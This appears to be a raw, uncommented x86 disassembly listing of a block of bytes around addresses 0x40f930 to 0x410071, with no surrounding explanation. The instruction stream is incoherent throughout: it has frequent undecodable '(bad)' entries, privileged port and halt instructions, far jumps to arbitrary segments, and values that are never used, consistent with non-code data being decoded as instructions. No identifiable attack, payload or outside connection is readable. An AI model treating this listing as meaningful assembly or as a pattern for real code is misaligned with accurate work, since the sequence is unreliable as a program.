  40f930:	mov    edx,0xefcfcb72
  40f935:	push   cs
  40f936:	test   al,0xe3
  40f938:	pop    ebx
  40f939:	sub    eax,0x405fa8cc
  40f93e:	jns    0x40f9bc
  40f940:	lea    edx,[ebp+edi*2-0x14]
  40f944:	retf   0x122a
  40f947:	std    
  40f948:	mov    ebx,?
  40f94a:	add    BYTE PTR [eax+0x38],al
  40f94d:	and    ebx,DWORD PTR [ebx]
  40f94f:	mov    ebp,edi
  40f951:	das    
  40f952:	(bad)  
  40f953:	mov    eax,ds:0x54c3ff4b
  40f958:	fcomp  DWORD PTR [eax+ebx*4-0x5]
  40f95c:	stc    
  40f95d:	inc    ebx
  40f95e:	lahf   
  40f95f:	leave  
  40f960:	inc    esp
  40f961:	jns    0x40f9c1
  40f963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f964:	cmp    eax,0x2593778f
  40f969:	inc    ebx
  40f96a:	mov    eax,ds:0x306a1c45
  40f96f:	xor    al,0x66
  40f971:	cmp    BYTE PTR [edx+0x4fc72d2d],0x15
  40f978:	mov    cs,ebx
  40f97a:	fidivr DWORD PTR [edi+0x6a]
  40f97d:	repnz mov DWORD PTR [edx],eax
  40f980:	addr16 pushf 
  40f982:	adc    esp,edx
  40f984:	outs   dx,DWORD PTR ds:[esi]
  40f985:	cmp    esp,DWORD PTR [ecx]
  40f987:	adc    ch,cl
  40f989:	xchg   BYTE PTR [ebx],dh
  40f98b:	out    dx,eax
  40f98c:	dec    ebp
  40f98d:	sbb    BYTE PTR [ecx-0x2b],ah
  40f990:	ret    
  40f991:	sbb    edi,esp
  40f993:	ja     0x40fa14
  40f995:	and    ecx,DWORD PTR [edx]
  40f997:	sbb    BYTE PTR [esi],dh
  40f999:	add    DWORD PTR [eax+0x245c12dd],0x62f97da1
  40f9a3:	outs   dx,BYTE PTR ds:[esi]
  40f9a4:	fs fsubr st,st(3)
  40f9a7:	mov    ds:0x84fce80d,eax
  40f9ac:	fldenv [ebx]
  40f9ae:	sub    al,0xdc
  40f9b0:	icebp  
  40f9b1:	inc    edi
  40f9b2:	and    al,0xc4
  40f9b4:	mov    cl,0x4c
  40f9b6:	stos   BYTE PTR es:[edi],al
  40f9b7:	mov    gs,WORD PTR ds:0xc22a47bf
  40f9bd:	ret    0xfd82
  40f9c0:	jg     0x40f9e8
  40f9c2:	jnp    0x40f996
  40f9c4:	stos   BYTE PTR es:[edi],al
  40f9c5:	aas    
  40f9c6:	adc    al,0x7d
  40f9c8:	dec    eax
  40f9c9:	cli    
  40f9ca:	xor    bh,BYTE PTR [edx+0x29a6aa74]
  40f9d0:	popf   
  40f9d1:	scas   eax,DWORD PTR es:[edi]
  40f9d2:	mov    ds:0x1825616f,al
  40f9d7:	dec    ecx
  40f9d8:	fnsave [ebx]
  40f9da:	cmp    ebx,esp
  40f9dc:	pop    ss
  40f9dd:	das    
  40f9de:	fwait
  40f9df:	aas    
  40f9e0:	fadd   QWORD PTR ds:0x9b269844
  40f9e6:	ins    BYTE PTR es:[edi],dx
  40f9e7:	inc    esi
  40f9e8:	cli    
  40f9e9:	sbb    BYTE PTR [ecx],dh
  40f9eb:	and    BYTE PTR [edi-0x4],al
  40f9ee:	es das 
  40f9f0:	xchg   ecx,eax
  40f9f1:	inc    ecx
  40f9f2:	fwait
  40f9f3:	leave  
  40f9f4:	sub    DWORD PTR [ecx-0x706606e1],edx
  40f9fa:	dec    eax
  40f9fb:	mov    edx,0xf7875951
  40fa00:	xchg   DWORD PTR [edi+0x3f],ebx
  40fa03:	cmovs  edx,esi
  40fa06:	jmp    0x9f99e8b3
  40fa0b:	inc    esp
  40fa0c:	xor    ch,BYTE PTR [ebp-0x13]
  40fa0f:	sbb    DWORD PTR [edx+0x56182071],esp
  40fa15:	dec    ebx
  40fa16:	push   fs
  40fa18:	jb     0x40f9e1
  40fa1a:	repz sub ah,BYTE PTR [esi-0x58]
  40fa1e:	call   0xd57:0xbc7cafc0
  40fa25:	rol    edx,cl
  40fa27:	mov    ds:0x31ad46d3,al
  40fa2c:	mov    edx,0xc009ddf8
  40fa31:	(bad)  
  40fa33:	ret    0x1d33
  40fa36:	cmp    al,0xa8
  40fa38:	add    al,0x30
  40fa3a:	add    eax,0xe9e9f97
  40fa3f:	imul   eax,DWORD PTR [ecx],0xffffff9e
  40fa42:	and    DWORD PTR [edx+0x17],edx
  40fa45:	sti    
  40fa46:	push   edx
  40fa47:	out    dx,eax
  40fa48:	sbb    edx,ebp
  40fa4a:	push   ds
  40fa4b:	adc    DWORD PTR [ebx-0x55],eax
  40fa4e:	push   0x77592a34
  40fa53:	icebp  
  40fa54:	xchg   esi,eax
  40fa55:	mov    BYTE PTR [ebx+0x71],al
  40fa58:	xor    al,ah
  40fa5a:	jmp    0x40fa34
  40fa5c:	or     BYTE PTR [eax],0x24
  40fa5f:	push   edi
  40fa60:	clc    
  40fa61:	test   al,0x5b
  40fa63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa64:	call   0x5f6432b
  40fa69:	hlt    
  40fa6a:	dec    esi
  40fa6b:	add    BYTE PTR [esi],dh
  40fa6d:	mov    bh,ah
  40fa6f:	xor    al,0xc3
  40fa71:	jmp    0xba35:0xeefe3ee5
  40fa78:	jnp    0x40facb
  40fa7a:	nop
  40fa7b:	inc    ebp
  40fa7c:	pop    ds
  40fa7d:	cmp    DWORD PTR [esi],0x5d1c8ad5
  40fa83:	(bad)  
  40fa84:	les    ebx,FWORD PTR [ebx-0x1cf65a22]
  40fa8a:	mov    BYTE PTR ds:0xdc6b0a2a,al
  40fa90:	push   ebx
  40fa91:	aam    0x41
  40fa93:	pcmpeqw mm0,mm5
  40fa96:	add    eax,eax
  40fa98:	mov    al,0xb2
  40fa9a:	fwait
  40fa9b:	push   cs
  40fa9c:	or     ch,BYTE PTR [esi]
  40fa9e:	sub    eax,0x33ae5720
  40faa3:	and    al,0xcb
  40faa5:	lods   al,BYTE PTR ds:[esi]
  40faa6:	mov    esp,0x3d6348a0
  40faab:	outs   dx,BYTE PTR ds:[esi]
  40faac:	bound  eax,QWORD PTR [ecx]
  40faae:	pusha  
  40faaf:	dec    ebx
  40fab0:	and    eax,0x74691e8
  40fab5:	aad    0x7a
  40fab7:	adc    edi,DWORD PTR [ecx+0x4c]
  40faba:	push   cs
  40fabb:	mov    bl,0xe5
  40fabd:	rol    BYTE PTR [eax-0x32],1
  40fac0:	sbb    ecx,ecx
  40fac2:	stos   BYTE PTR es:[edi],al
  40fac3:	push   esi
  40fac4:	test   eax,0x9522e8a0
  40fac9:	in     eax,dx
  40faca:	div    BYTE PTR [ecx+0x23]
  40facd:	leave  
  40face:	pushf  
  40facf:	jge    0x40fa9f
  40fad1:	adc    ch,ah
  40fad3:	xchg   ecx,eax
  40fad4:	bound  edi,QWORD PTR [edx-0x4c5393b8]
  40fada:	loopne 0x40fb02
  40fadc:	jnp    0x40fb47
  40fade:	mov    dh,0xbf
  40fae0:	jbe    0x40fb60
  40fae2:	pop    edx
  40fae3:	xor    DWORD PTR es:[ecx+0x2c27ffca],eax
  40faea:	fadd   DWORD PTR [esi+ecx*4-0x59]
  40faee:	aaa    
  40faef:	inc    edx
  40faf0:	mov    DWORD PTR [edi],edx
  40faf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faf3:	cs inc ebx
  40faf5:	imul   edi,DWORD PTR [ecx-0x39bf4be3],0xfffffff9
  40fafc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fafd:	xor    BYTE PTR [ebp-0x1c],dl
  40fb00:	mov    cl,BYTE PTR ds:0x9f589f12
  40fb06:	movsx  ebp,bl
  40fb09:	fadd   DWORD PTR [esp+edx*1-0x22]
  40fb0d:	in     eax,dx
  40fb0e:	rcl    BYTE PTR [edi],0x8c
  40fb11:	cmp    cl,ch
  40fb13:	(bad)  
  40fb14:	sub    ebx,DWORD PTR [ebx+0x5f]
  40fb17:	cmp    BYTE PTR [edi+0x3ca68508],al
  40fb1d:	inc    edi
  40fb1e:	fstp   DWORD PTR [ecx]
  40fb20:	inc    ecx
  40fb21:	mov    edi,0x8d27c12d
  40fb26:	inc    edi
  40fb27:	mov    edx,0x1eba5aba
  40fb2c:	xor    dh,dh
  40fb2e:	and    al,0xd2
  40fb30:	sub    bh,BYTE PTR [ebx+0xb]
  40fb33:	and    BYTE PTR [edi-0xd6bd59f],cl
  40fb39:	loope  0x40fb1c
  40fb3b:	and    ebx,eax
  40fb3d:	pop    esi
  40fb3e:	push   edi
  40fb3f:	fwait
  40fb40:	mov    bl,0x8
  40fb42:	fwait
  40fb43:	push   0xc20bbcf6
  40fb48:	iret   
  40fb49:	loope  0x40fb93
  40fb4b:	xchg   ebp,eax
  40fb4c:	mov    WORD PTR [ecx+0x4],?
  40fb4f:	mov    ah,0x4c
  40fb51:	xor    esp,edi
  40fb53:	mov    dh,0x6a
  40fb55:	inc    ecx
  40fb56:	cdq    
  40fb57:	xor    edi,0xbfc5022a
  40fb5d:	outs   dx,DWORD PTR ds:[esi]
  40fb5e:	outs   dx,BYTE PTR es:[esi]
  40fb60:	call   0x2caafd66
  40fb65:	int3   
  40fb66:	rcl    BYTE PTR [esi+0x31652340],cl
  40fb6c:	imul   esi,DWORD PTR [edx],0x7a74ffa8
  40fb72:	mov    ebp,0xd52131ab
  40fb77:	or     al,0xac
  40fb79:	lahf   
  40fb7a:	mov    DWORD PTR [ecx],ecx
  40fb7c:	enter  0xf691,0x42
  40fb80:	sahf   
  40fb81:	das    
  40fb82:	add    BYTE PTR [ebp-0x30],al
  40fb85:	push   ecx
  40fb86:	mov    WORD PTR [ebx+0x257cf1a],?
  40fb8c:	jmp    0x1b14:0x48fc816b
  40fb93:	outs   dx,BYTE PTR ds:[esi]
  40fb94:	cmp    DWORD PTR [edx-0x187af800],ecx
  40fb9a:	jmp    0xf236c903
  40fb9f:	jecxz  0x40fb4c
  40fba1:	dec    edi
  40fba2:	mov    esi,0x3609dccf
  40fba7:	push   esi
  40fba8:	sar    BYTE PTR [esi+0x3a99149],1
  40fbae:	inc    ebx
  40fbaf:	loope  0x40fb62
  40fbb1:	sbb    al,0x8f
  40fbb3:	ins    DWORD PTR es:[edi],dx
  40fbb4:	push   esp
  40fbb5:	js     0x40fbfc
  40fbb7:	push   ss
  40fbb8:	adc    eax,DWORD PTR [eax-0x2a]
  40fbbb:	cwde   
  40fbbc:	xchg   ecx,eax
  40fbbd:	mov    WORD PTR [ebx+edi*2-0x666f238b],?
  40fbc4:	mov    ah,0x95
  40fbc6:	sbb    DWORD PTR [ebp-0x717b8548],ecx
  40fbcc:	push   eax
  40fbcd:	mov    ah,0xa5
  40fbcf:	rol    bl,1
  40fbd1:	mov    WORD PTR [ecx],ds
  40fbd3:	rcl    esp,cl
  40fbd5:	lods   eax,DWORD PTR ds:[esi]
  40fbd6:	mov    cl,0xfd
  40fbd8:	and    eax,0xcc0f6839
  40fbdd:	sub    dh,BYTE PTR [ebx-0x34]
  40fbe0:	dec    ecx
  40fbe1:	sbb    bl,BYTE PTR [ebx-0x4818f94a]
  40fbe7:	dec    edx
  40fbe8:	adc    DWORD PTR [ebx+ecx*1-0x2e],esp
  40fbec:	nop
  40fbed:	retf   
  40fbee:	sbb    eax,0x9c8e0d47
  40fbf3:	xchg   edx,eax
  40fbf4:	jnp    0x40fc6e
  40fbf6:	rcr    DWORD PTR [bp+di],1
  40fbf9:	js     0x40fc29
  40fbfb:	cld    
  40fbfc:	xor    cl,BYTE PTR [edi+0x7b]
  40fbff:	loopne 0x40fc77
  40fc01:	mov    es,edx
  40fc03:	xchg   esp,eax
  40fc04:	icebp  
  40fc05:	popa   
  40fc06:	inc    edx
  40fc07:	push   ebp
  40fc08:	sbb    ebx,DWORD PTR [esi]
  40fc0a:	in     al,dx
  40fc0b:	neg    BYTE PTR [ebp-0x56565150]
  40fc11:	bsr    edx,DWORD PTR [ebx]
  40fc14:	or     al,0xc5
  40fc16:	cdq    
  40fc17:	leave  
  40fc18:	ins    BYTE PTR es:[edi],dx
  40fc19:	sub    al,0x5f
  40fc1b:	jnp    0x40fc01
  40fc1d:	outs   dx,DWORD PTR ds:[esi]
  40fc1e:	jno    0x40fc15
  40fc20:	add    eax,0x72d65723
  40fc25:	(bad)  
  40fc26:	adc    esi,DWORD PTR [edx]
  40fc28:	jle    0x40fbf5
  40fc2a:	aad    0xbb
  40fc2c:	cld    
  40fc2d:	shl    DWORD PTR [ebx-0x40f76809],1
  40fc33:	xchg   ecx,eax
  40fc34:	mov    BYTE PTR [edi-0x1d1e9025],cl
  40fc3a:	into   
  40fc3b:	sub    BYTE PTR [ebp-0x30],ch
  40fc3e:	cwde   
  40fc3f:	int3   
  40fc40:	aam    0xa3
  40fc42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc43:	loope  0x40fc03
  40fc45:	push   es
  40fc46:	push   ss
  40fc47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc48:	sub    BYTE PTR [ecx+ecx*1+0x51],0xcf
  40fc4d:	mov    ds,edi
  40fc4f:	and    BYTE PTR [esi+0x60b3a01d],ch
  40fc55:	adc    al,0x97
  40fc57:	mul    bh
  40fc59:	cmp    cl,BYTE PTR [eax-0x6a]
  40fc5c:	cwde   
  40fc5d:	xchg   edi,eax
  40fc5e:	loop   0x40fc79
  40fc60:	mov    eax,ds:0xb58e3379
  40fc65:	push   ebx
  40fc66:	(bad)  
  40fc67:	mov    fs,edi
  40fc69:	arpl   WORD PTR [esi],ax
  40fc6b:	stc    
  40fc6c:	dec    esi
  40fc6d:	mov    ah,0x89
  40fc6f:	clc    
  40fc70:	or     eax,0x35850b1f
  40fc75:	pop    DWORD PTR [ebp-0x7a40aadb]
  40fc7b:	xor    dl,ah
  40fc7d:	xor    al,0x18
  40fc7f:	sahf   
  40fc80:	pop    es
  40fc81:	sub    BYTE PTR [ecx],ah
  40fc83:	aaa    
  40fc84:	aas    
  40fc85:	fld    TBYTE PTR [ebp-0x1a3c03af]
  40fc8b:	sub    sp,WORD PTR [ebx+0x66ec27d1]
  40fc92:	mov    dh,0x8f
  40fc94:	out    0xbc,al
  40fc96:	ss jbe 0x40fca9
  40fc99:	iret   
  40fc9a:	enter  0xe910,0x9
  40fc9e:	inc    ecx
  40fc9f:	(bad)  
  40fca0:	xchg   esi,eax
  40fca1:	and    BYTE PTR cs:[ecx],dl
  40fca4:	cmc    
  40fca5:	or     eax,0x12a3e3b8
  40fcaa:	cdq    
  40fcab:	xlat   BYTE PTR ds:[ebx]
  40fcac:	xchg   dl,ch
  40fcae:	mov    al,ds:0x73144b89
  40fcb3:	xor    dl,al
  40fcb5:	mov    al,0x43
  40fcb7:	mov    ebp,0xb2a82ecf
  40fcbc:	mov    cl,0xf2
  40fcbe:	inc    ebp
  40fcbf:	shl    DWORD PTR [edi-0x64a397f0],1
  40fcc5:	in     al,0xaa
  40fcc7:	aad    0x17
  40fcc9:	fidivr DWORD PTR [ebx+0x24a8ae56]
  40fccf:	and    BYTE PTR [edx+0x4cbf7ecd],dh
  40fcd5:	bound  esp,QWORD PTR [eax-0x10]
  40fcd8:	xor    DWORD PTR [ecx+esi*2],edi
  40fcdb:	mov    ebx,0x4fb26a7d
  40fce0:	or     DWORD PTR [ebp+0x66],0x59
  40fce4:	sub    al,BYTE PTR [ebx+0x62]
  40fce7:	jmp    0xa4fbf2c1
  40fcec:	xor    al,0xb2
  40fcee:	fwait
  40fcef:	inc    ebp
  40fcf0:	sbb    eax,0x156c0e31
  40fcf5:	xor    eax,0x13de901
  40fcfa:	push   ss
  40fcfb:	imul   eax,DWORD PTR [eax-0x22],0x7d1439e3
  40fd02:	retf   0xf55e
  40fd05:	sub    BYTE PTR [edi-0x280953d],cl
  40fd0b:	pop    esi
  40fd0c:	cmp    al,0x66
  40fd0e:	sub    BYTE PTR [ebp-0x3eb7b7c9],ch
  40fd14:	stos   BYTE PTR es:[edi],al
  40fd15:	scas   eax,DWORD PTR es:[edi]
  40fd16:	imul   esp,edi,0x8dba5021
  40fd1c:	sub    cl,dl
  40fd1e:	xchg   DWORD PTR [ebx-0x31],esp
  40fd21:	jecxz  0x40fd4e
  40fd23:	and    al,0xc9
  40fd25:	adc    DWORD PTR [esi],ecx
  40fd27:	pop    esp
  40fd28:	scas   eax,DWORD PTR es:[edi]
  40fd29:	pop    esi
  40fd2a:	lds    edx,FWORD PTR [ecx+0x6b]
  40fd2d:	push   edx
  40fd2e:	dec    esp
  40fd2f:	stos   BYTE PTR es:[edi],al
  40fd30:	rol    bl,cl
  40fd32:	mov    ebp,0xa11835a6
  40fd37:	xor    bh,bl
  40fd39:	push   edx
  40fd3a:	mov    ah,0x6f
  40fd3c:	in     al,0x6e
  40fd3e:	sbb    eax,0x3d36fb58
  40fd43:	in     al,0xd
  40fd45:	inc    esi
  40fd46:	ss loopne 0x40fd8a
  40fd49:	rcr    DWORD PTR [edi+eiz*2+0x28211318],cl
  40fd50:	mov    edx,0x4048512c
  40fd55:	pop    ebx
  40fd56:	add    al,BYTE PTR [ecx]
  40fd58:	fimul  WORD PTR ds:0xc308419b
  40fd5e:	cs push esp
  40fd60:	lds    esp,FWORD PTR [edi-0x60422588]
  40fd66:	int3   
  40fd67:	enter  0x477c,0x6f
  40fd6b:	dec    ecx
  40fd6c:	mov    esi,0xf9df4fb4
  40fd71:	es push cs
  40fd73:	pop    eax
  40fd74:	jmp    0x40fd72
  40fd76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd77:	dec    edi
  40fd78:	call   FWORD PTR [ecx]
  40fd7a:	adc    cl,BYTE PTR [edx]
  40fd7c:	xor    cl,bl
  40fd7e:	or     eax,0xb64ab8f8
  40fd83:	scas   al,BYTE PTR es:[edi]
  40fd84:	fs inc ebp
  40fd86:	fisub  WORD PTR [edx]
  40fd88:	cmp    BYTE PTR [edi+eiz*8],0xfe
  40fd8c:	sub    bl,BYTE PTR [esi]
  40fd8e:	sahf   
  40fd8f:	cmp    al,0xd2
  40fd91:	xchg   edi,eax
  40fd92:	jns    0x40fd40
  40fd94:	scas   al,BYTE PTR es:[edi]
  40fd95:	nop
  40fd96:	and    eax,0x8b1a8885
  40fd9b:	and    ebp,DWORD PTR es:[eax+0x53]
  40fd9f:	mov    gs,WORD PTR [eax+ebx*1]
  40fda2:	pusha  
  40fda3:	xor    BYTE PTR [esi-0x1e],bh
  40fda6:	push   ebp
  40fda7:	bound  edx,QWORD PTR [edx+0x52e5853f]
  40fdad:	clc    
  40fdae:	mov    al,ds:0x957b73e8
  40fdb3:	inc    esi
  40fdb4:	or     bl,BYTE PTR [edx+0x260a20a5]
  40fdba:	cli    
  40fdbb:	clc    
  40fdbc:	xchg   esi,eax
  40fdbd:	fdiv   DWORD PTR [edx-0x5ce0e2c0]
  40fdc3:	leave  
  40fdc4:	(bad)  
  40fdc5:	loop   0x40fddd
  40fdc7:	test   BYTE PTR [esi],ah
  40fdc9:	cmc    
  40fdca:	jae    0x40fe2a
  40fdcc:	inc    ecx
  40fdcd:	inc    ecx
  40fdce:	inc    eax
  40fdcf:	lds    esp,FWORD PTR [edi+ebx*1]
  40fdd2:	push   ebx
  40fdd3:	add    eax,0x2c376581
  40fdd8:	in     eax,0xcb
  40fdda:	push   ss
  40fddb:	sub    edi,DWORD PTR [ecx+0x35646662]
  40fde1:	sub    cl,ch
  40fde3:	out    dx,al
  40fde4:	push   0xa7ddc731
  40fde9:	push   edi
  40fdea:	jl     0x40fd8f
  40fdec:	or     ebp,DWORD PTR [ebp+eiz*4-0x442a03e2]
  40fdf3:	push   esi
  40fdf4:	add    al,0xe6
  40fdf6:	cld    
  40fdf7:	mov    ah,0xb
  40fdf9:	popa   
  40fdfa:	push   eax
  40fdfb:	(bad)  
  40fdfc:	jge    0x40fe18
  40fdfe:	lea    esi,[ecx+0x5e63fca6]
  40fe04:	lods   al,BYTE PTR ds:[esi]
  40fe05:	or     al,0x25
  40fe07:	les    eax,FWORD PTR [edi+0x52d5bd18]
  40fe0d:	adc    edx,DWORD PTR [ecx]
  40fe0f:	daa    
  40fe10:	out    dx,eax
  40fe11:	cld    
  40fe12:	fiadd  WORD PTR [edx-0x33]
  40fe15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe16:	fmul   st(6),st
  40fe18:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe1a:	mov    bh,0x6f
  40fe1c:	js     0x40fe36
  40fe1e:	rol    WORD PTR [eax+0x2c77509f],0xda
  40fe26:	mov    WORD PTR [eax+0x70],?
  40fe29:	jno    0x40fe2e
  40fe2b:	sub    BYTE PTR [ebx],dh
  40fe2d:	cmp    ecx,eax
  40fe2f:	sub    eax,0x883d4e38
  40fe34:	mov    ds:0xb96b8ff4,al
  40fe39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe3a:	stos   DWORD PTR es:[edi],eax
  40fe3b:	push   ss
  40fe3c:	(bad)  
  40fe3d:	mov    eax,0xa835c347
  40fe42:	fiadd  DWORD PTR [ebx-0x3de20375]
  40fe48:	jmp    0x235cd4c6
  40fe4d:	int    0x9f
  40fe4f:	lods   al,BYTE PTR ds:[esi]
  40fe50:	push   cs
  40fe51:	sbb    eax,0xedf1e78d
  40fe56:	cmp    BYTE PTR [ecx],ah
  40fe58:	xor    dh,bh
  40fe5a:	pop    edx
  40fe5b:	pop    edx
  40fe5c:	add    DWORD PTR [edx],ebx
  40fe5e:	xchg   DWORD PTR fs:[ebp+0x40a21d6c],edx
  40fe65:	mov    ds:0x7e775858,eax
  40fe6a:	aaa    
  40fe6b:	and    BYTE PTR [edi],cl
  40fe6d:	bound  eax,QWORD PTR [ebx+0x143d670a]
  40fe73:	test   eax,0x24b35b5a
  40fe78:	leave  
  40fe79:	cmc    
  40fe7a:	out    dx,al
  40fe7b:	fs push ebp
  40fe7d:	dec    esi
  40fe7e:	pushf  
  40fe7f:	arpl   cx,bx
  40fe81:	repnz aam 0xd5
  40fe84:	mov    ds:0x60808250,al
  40fe89:	pushw  es
  40fe8b:	(bad)
  40fe8e:	pushf  
  40fe8f:	in     eax,dx
  40fe90:	hlt    
  40fe91:	mov    edx,0x11a7455a
  40fe96:	dec    eax
  40fe97:	push   0x8c4e9d12
  40fe9c:	inc    edi
  40fe9d:	pushf  
  40fe9e:	pusha  
  40fe9f:	pop    esi
  40fea0:	jmp    0x40fe41
  40fea2:	(bad)  
  40fea3:	pop    ss
  40fea4:	pusha  
  40fea5:	sub    eax,0x7566064a
  40feaa:	sbb    BYTE PTR [edx-0x3474b1d],cl
  40feb0:	inc    esi
  40feb1:	aam    0x14
  40feb3:	and    BYTE PTR [eax],0xd5
  40feb6:	push   edx
  40feb7:	mov    ds:0x117a1944,al
  40febc:	jnp    0x40fead
  40febe:	ret    0x4204
  40fec1:	sbb    esi,esp
  40fec3:	fcom   DWORD PTR es:[ebp+0x1f45480d]
  40feca:	lea    ebx,[edx+esi*4]
  40fecd:	jmp    0x40feb4
  40fecf:	leave  
  40fed0:	loop   0x40feab
  40fed2:	mov    cl,0xad
  40fed4:	scas   al,BYTE PTR es:[edi]
  40fed5:	push   0xbfd304d6
  40feda:	addr16 adc eax,ebp
  40fedd:	(bad)  [ebx+0x543e9fef]
  40fee3:	inc    edx
  40fee4:	sub    al,0xaf
  40fee6:	mov    DWORD PTR [edx+ebp*4-0x4014d623],ebp
  40feed:	ror    ebp,1
  40feef:	jae    0x40fe73
  40fef1:	pushf  
  40fef2:	std    
  40fef3:	sbb    BYTE PTR [ebp+0x4e2b4d73],dh
  40fef9:	jbe    0x40fee0
  40fefb:	push   0x22f3d6f6
  40ff00:	daa    
  40ff01:	jmp    0xfb3ebc4a
  40ff06:	or     ah,BYTE PTR [esi]
  40ff08:	out    0x63,al
  40ff0a:	add    BYTE PTR [ebp+edi*1-0x1d],bl
  40ff0e:	mov    WORD PTR [eax],ds
  40ff10:	daa    
  40ff11:	and    BYTE PTR cs:[ecx],ch
  40ff14:	bound  eax,QWORD PTR [edx+0x45]
  40ff17:	mov    dh,0xe2
  40ff19:	popf   
  40ff1a:	mov    bh,0xc5
  40ff1c:	push   edx
  40ff1d:	lods   al,BYTE PTR ds:[esi]
  40ff1e:	(bad)  
  40ff1f:	xchg   esp,eax
  40ff20:	test   DWORD PTR [ecx],0x16e05c14
  40ff26:	push   0x59f1972d
  40ff2b:	pop    esi
  40ff2c:	outs   dx,BYTE PTR ds:[esi]
  40ff2d:	dec    ebx
  40ff2e:	jb     0x40ff62
  40ff30:	sti    
  40ff31:	mov    bh,0x54
  40ff33:	enter  0xc7c3,0xda
  40ff37:	outs   dx,DWORD PTR ds:[esi]
  40ff38:	and    eax,0xb7becce2
  40ff3d:	fstp   QWORD PTR [esi+edi*1]
  40ff40:	int3   
  40ff41:	adc    ebp,DWORD PTR [ebp-0x7e]
  40ff44:	dec    esp
  40ff45:	pop    edi
  40ff46:	dec    ebp
  40ff47:	test   DWORD PTR [ecx+0x625d99d4],ebx
  40ff4d:	clc    
  40ff4e:	cmp    ecx,edi
  40ff50:	neg    BYTE PTR [ecx-0x6b591600]
  40ff56:	loope  0x40ff53
  40ff58:	adc    dh,cl
  40ff5a:	inc    esi
  40ff5b:	into   
  40ff5c:	mov    esi,0xd1d9cb07
  40ff61:	mov    esi,0x14076be2
  40ff66:	leave  
  40ff67:	dec    esi
  40ff68:	mov    al,bl
  40ff6a:	jl     0x40ff72
  40ff6c:	sub    eax,0x3a89f748
  40ff71:	inc    esp
  40ff72:	or     al,dh
  40ff74:	lods   eax,DWORD PTR ds:[esi]
  40ff75:	or     ebx,edx
  40ff77:	xor    bh,BYTE PTR [ebx]
  40ff79:	aaa    
  40ff7a:	js     0x40ffce
  40ff7c:	and    DWORD PTR [ebp-0x2ec1e1bd],ecx
  40ff82:	cld    
  40ff83:	frstor [edx-0x54]
  40ff86:	cli    
  40ff87:	inc    DWORD PTR ds:[edi+0x65851072]
  40ff8e:	add    dh,BYTE PTR [ecx]
  40ff90:	ja     0x40ff4d
  40ff92:	pop    ebx
  40ff93:	mov    ah,0xef
  40ff95:	mov    ch,0xca
  40ff97:	jl     0x40ffb0
  40ff99:	retf   0x1494
  40ff9c:	xor    BYTE PTR [esi-0x12d0d5cb],dl
  40ffa2:	idiv   DWORD PTR [edx]
  40ffa4:	cs sbb al,0xcf
  40ffa7:	sar    BYTE PTR [ebx+edx*4],cl
  40ffaa:	pop    eax
  40ffab:	aad    0x70
  40ffad:	xchg   ebp,eax
  40ffae:	mov    BYTE PTR [edx-0x15dbf07e],ah
  40ffb4:	push   0x7e
  40ffb6:	push   ebp
  40ffb7:	mov    ds:0xc7d3d385,al
  40ffbc:	ss out dx,eax
  40ffbe:	xlat   BYTE PTR ds:[ebx]
  40ffbf:	test   eax,0xdb728eb6
  40ffc4:	mov    ebx,0x18046a4f
  40ffc9:	scas   eax,DWORD PTR es:[edi]
  40ffca:	xor    BYTE PTR [eax-0x58],0xe8
  40ffce:	stos   DWORD PTR es:[edi],eax
  40ffcf:	cs fs pop ds
  40ffd2:	dec    ecx
  40ffd3:	retf   
  40ffd4:	inc    esp
  40ffd5:	sub    bh,dl
  40ffd7:	xchg   esp,eax
  40ffd8:	ins    DWORD PTR es:[edi],dx
  40ffd9:	dec    esp
  40ffda:	out    dx,eax
  40ffdb:	lods   al,BYTE PTR ds:[esi]
  40ffdc:	sbb    eax,0x7765fb39
  40ffe1:	add    ebp,DWORD PTR [edx+0x46]
  40ffe4:	sbb    ecx,DWORD PTR [ebp+0x418e88dd]
  40ffea:	jne    0x40ff94
  40ffec:	aam    0x6c
  40ffee:	sbb    esi,DWORD PTR [esp+ecx*2-0x39]
  40fff2:	scas   al,BYTE PTR es:[edi]
  40fff3:	test   DWORD PTR [esi+0xfefdf32],ebx
  40fff9:	dec    edx
  40fffa:	mov    eax,DWORD PTR [ebp+0x72bb1dc7]
  410000:	es in  al,0xf6
  410003:	into   
  410004:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410005:	fdivrp st(3),st
  410007:	sar    bh,1
  410009:	out    dx,al
  41000a:	in     eax,dx
  41000b:	sbb    ebx,DWORD PTR [ebx-0x1e]
  41000e:	(bad)  
  41000f:	xor    dl,BYTE PTR [ebp-0x2f]
  410012:	nop
  410013:	or     BYTE PTR [eax-0x5c],ch
  410016:	push   ss
  410017:	add    ch,bh
  410019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41001a:	sbb    DWORD PTR [ebx-0x7b],0x385004d4
  410021:	not    BYTE PTR [ebp-0x77]
  410024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410025:	xchg   ecx,eax
  410026:	sub    DWORD PTR [ebp-0x64],ebx
  410029:	jmp    0xad15ab8
  41002e:	pop    esi
  41002f:	mov    eax,0xf6e5292d
  410034:	mov    ebx,0x19700325
  410039:	mov    ds:0xf74ad815,eax
  41003e:	test   DWORD PTR [ecx+0x648c70e],ebx
  410044:	inc    edi
  410045:	jmp    0x41001b
  410047:	das    
  410048:	add    DWORD PTR [edi-0x416a781e],edi
  41004e:	aad    0xfa
  410050:	dec    ebx
  410051:	xlat   BYTE PTR ds:[ebx]
  410052:	jge    0x41008b
  410054:	push   0xbb56771c
  410059:	outs   dx,DWORD PTR ds:[esi]
  41005a:	push   esp
  41005b:	out    0xbc,eax
  41005d:	xchg   edi,eax
  41005e:	inc    ecx
  41005f:	sbb    eax,0xcbbf59ab
  410064:	ret    0x72b9
  410067:	cmp    bl,BYTE PTR [ecx-0x2b]
  41006a:	jno    0x410023
  41006c:	jns    0x4100bf
  41006e:	cs dec esp
  410070:	retf   
  410071:	or     eax,0x12069566
